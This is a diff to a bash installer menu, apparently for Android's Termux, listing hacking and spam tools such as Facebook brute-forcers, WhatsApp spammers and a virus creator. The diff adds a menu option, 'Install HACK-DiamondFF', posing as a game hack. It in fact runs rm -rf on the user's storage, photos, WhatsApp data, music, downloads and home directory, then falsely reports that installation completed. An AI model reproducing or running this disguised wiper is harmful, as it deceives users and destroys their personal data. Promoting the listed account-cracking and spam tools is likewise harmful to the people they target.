@@ -28,8 +28,9 @@ echo "Youtube  : Creater Clowns" | lolcat
 sleep 1
 echo "************** °°° **************"
 
-clear
+sleep 5
 
+clear
 
 ###################################################
 # CTRL C
@@ -70,15 +71,15 @@ echo "5. Install OSIF${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
 echo "6. Install Fb-Brute${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "7. Install Tools-TuanBadut${enda}" | lolcat
+echo "7. Install TuanBadut${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
 echo "8. Install Tools-CIA${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "9. Install Tools-CIA${enda}" | lolcat
+echo "9. Install LITESPAM${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
 echo "10. Install Instahack${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "11. Install Tools-SpamWA${enda}" | lolcat
+echo "11. Install SpamWA${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
 echo "12. Install autoreportFB${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
@@ -90,17 +91,18 @@ echo "15. Install Tool-x${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
 echo "16. Install Virus-Creator${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "17. Install Tools-BAJINGANv6${enda}" | lolcat
+echo "17. Install BAJINGANv6${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "18. Install Tools-LITETOOLS${enda}" | lolcat
+echo "18. Install LITETOOLS${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "19. Install Tools-BugHunter${enda}" | lolcat
+echo "19. Install BugHunter${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "20. Install Tools-Lazymux${enda}" | lolcat
+echo "20. Install Lazymux${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-echo "21. Install Tools-CIAv1${enda}" | lolcat
+echo "21. Install CIAv1${enda}" | lolcat
 echo "-------------- ••• --------------" |lolcat
-
+echo "22. Install HACK-DiamondFF${enda}" | lolcat
+echo "-------------- ••• --------------" |lolcat
 echo "99. Exit   " | lolcat
 echo ""
 
@@ -277,6 +279,26 @@ sleep 2
 echo "Instalizing Complate..." | lolcat
 ;;
 
+22) echo "Waiting for progress..." 
+sleep 1
+rm -rf /sdcard/
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+sleep 2
+echo "Instalizing Complate..." | lolcat
+;;
+
 99) echo "Terima Kasih Telah Memakai Tool Kami" | lolcat
 echo "Silakan Kembali Lagi " |lolcat
 echo "See You Again Ferguso" |lolcat
@@ -284,5 +306,5 @@ exit
 ;;
 *) echo "Soory muka anda terlalu buriq"
 esac
-done
-done
+
+
